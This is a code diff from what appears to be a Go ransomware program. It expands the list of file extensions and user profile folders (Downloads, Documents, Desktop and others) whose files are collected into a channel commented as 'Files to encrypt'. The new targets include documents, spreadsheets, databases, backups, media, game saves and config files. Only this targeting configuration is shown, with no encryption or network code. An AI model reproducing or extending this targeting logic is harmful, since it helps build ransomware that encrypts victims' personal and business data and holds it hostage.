@@ -12,10 +12,39 @@ var (
 	BaseDir = fmt.Sprintf("%s\\", os.Getenv("USERPROFILE"))
 
 	// Directories inside BaseDir to loop over
-	InterestingDirs = []string{"Downloads", "Videos", "Pictures", "Documents", "Music", "Desktop"}
+	InterestingDirs = []string{
+		"Downloads", "Videos", "Pictures", "Documents", "Music", "Desktop",
+	}
 
 	// Interesting extensions to match files
-	InterestingExtensions = []string{"doc", "docx", "png", "jpeg", "jpg", "pdf", "txt", "svg", "gif"}
+	InterestingExtensions = []string{
+		// Text Files
+		"doc", "docx", "msg", "odt", "wpd", "wps", "txt",
+		// Data files
+		"csv", "pps", "ppt", "pptx",
+		// Audio Files
+		"aif", "iif", "m3u", "m4a", "mid", "mp3", "mpa", "wav", "wma",
+		// Video Files
+		"3gp", "3g2", "avi", "flv", "m4v", "mov", "mp4", "mpg", "vob", "wmv",
+		// 3D Image files
+		"3dm", "3ds", "max", "obj", "blend",
+		// Raster Image Files
+		"bmp", "gif", "png", "jpeg", "jpg", "psd", "tif", "gif", "ico",
+		// Vector Image files
+		"ai", "eps", "ps", "svg",
+		// Page Layout Files
+		"pdf", "indd", "pct",
+		// Spreadsheet Files
+		"xls", "xlr", "xlsx",
+		// Database Files
+		"accdb", "sqlite", "dbf", "mdb", "pdb", "sql",
+		// Game Files
+		"dem", "gam", "nes", "rom", "sav",
+		// Temp Files
+		"bkp", "bak", "tmp",
+		// Config files
+		"cfg", "ini", "prf",
+	}
 
 	// Files to encrypt that match the extensions pattern
 	MatchedFiles = make(chan File)
